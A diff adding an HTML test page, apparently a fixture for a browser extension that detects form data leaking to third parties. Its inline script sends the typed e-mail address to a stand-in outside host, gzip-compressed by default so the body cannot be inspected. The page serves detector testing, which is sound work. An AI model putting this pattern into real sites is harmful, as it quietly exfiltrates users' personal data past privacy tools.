@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="ru">
+  <head>
+    <meta charset="utf-8" />
+    <title>forms: opaque batcher</title>
+  </head>
+  <body>
+    <h1 id="title">Аналитика с упакованными пакетами событий</h1>
+    <!-- On change the page batches the field into JSON and sends it to a third party gzip-compressed
+         (CompressionStream, text/plain, no-cors): the body cannot be checked, so the extension may only say
+         opaque-after-input (low). With ?plain=1 the same JSON goes uncompressed and the value is found as plain text. -->
+    <form id="form" action="#" onsubmit="return false">
+      <label>E-mail <input id="email" type="email" name="email" autocomplete="email" /></label>
+    </form>
+    <script src="lib.js"></script>
+    <script>
+      var plain = window.formsLib.params.get('plain') === '1';
+      var endpoint = window.formsLib.receiver('rec.collect.example.org') + '/fsink/batch';
+      var field = document.getElementById('email');
+      function post(body) {
+        return fetch(endpoint, { method: 'POST', mode: 'no-cors', headers: { 'content-type': 'text/plain' }, body: body }).catch(function () {});
+      }
+      field.addEventListener('change', function () {
+        var json = JSON.stringify({ events: [{ t: 'input', email: field.value }] });
+        if (plain) {
+          post(json);
+          window.formsLib.note('plain');
+          return;
+        }
+        var stream = new Blob([json]).stream().pipeThrough(new CompressionStream('gzip'));
+        new Response(stream).arrayBuffer().then(function (buf) {
+          post(new Uint8Array(buf));
+          window.formsLib.note('gzip');
+        });
+      });
+    </script>
+  </body>
+</html>
